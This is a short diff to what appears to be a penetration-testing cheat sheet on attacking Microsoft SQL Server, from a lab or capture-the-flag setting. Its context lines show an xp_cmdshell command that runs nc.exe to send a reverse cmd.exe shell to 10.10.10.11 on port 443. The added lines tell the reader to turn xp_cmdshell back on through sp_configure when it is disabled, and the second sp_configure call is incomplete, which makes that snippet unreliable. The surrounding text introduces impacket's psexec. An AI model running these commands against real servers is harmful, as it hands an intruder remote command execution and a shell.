@@ -26,6 +26,13 @@ SQL>
     xp_cmdshell powershell "%TEMP%\nc.exe -nv 10.10.10.11 443 -e cmd.exe
     ```
 
+If xp_cmdshell is not enabled try to check if the user can change de config
+
+```bash
+sp_configure "xp_cmdshell", 1
+sp_configure ""
+```
+
 ## Connect to machine with PSEXEC {-}
 
 **psexec** is a tool from the impacket package. You can use it to connect to windows machines with a user and password.
